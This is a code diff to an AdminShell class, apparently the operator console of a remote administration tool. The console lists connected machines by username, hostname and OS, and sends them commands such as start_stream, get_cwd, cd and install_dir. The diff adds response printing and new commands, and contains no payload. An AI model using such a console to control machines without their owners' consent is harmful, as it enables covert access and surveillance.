@@ -37,7 +37,12 @@ class AdminShell:
 
         @self.sio_client.on('response')
         def on_response(res):
-            self.console.print(res["data"])
+            if type(res["data"]) is bool:
+                self.bool_data_print(res["data"])
+            elif type(res["data"]) is list:
+                self.list_data_print(res["data"])
+            else:
+                self.console.print(res["data"])
             self.condition_responded = True
 
     def run(self):
@@ -90,10 +95,14 @@ class AdminShell:
             self.send_command({"event": "start_stream"})
         elif cli_spl[0] == "kill_stream":
             self.send_command({"event": "kill_stream"})
-        elif cli_spl[0] == "cwd":
-            self.send_command({"event": "cwd"})
+        elif cli_spl[0] == "get_cwd":
+            self.send_command({"event": "get_cwd"})
+        elif cli_spl[0] == "cd":
+            self.send_command({"event": "cd", "path": cli_spl[1]})
         elif cli_spl[0] == "install_dir":
             self.send_command({"event": "install_dir"})
+        elif cli_spl[0] == "clear":
+            self.console.clear()
         else:
             self.print_error_msg("Invalid command")
 
@@ -128,6 +137,16 @@ class AdminShell:
             client_table.add_row(str(client["id"]), client["username"], client["hostname"], client["os"])
 
         self.console.print(client_table)
+
+    def bool_data_print(self, data: bool):
+        if data:
+            self.console.print("[bold green]Successfully executed command[/bold green]")
+        else:
+            self.print_error_msg("Error while executing command")
+
+    def list_data_print(self, data):
+        for d in data:
+            self.console.print("[bold green]" + d + "[/bold green]")
 
     def sync_responded(self):
         while not self.condition_responded:
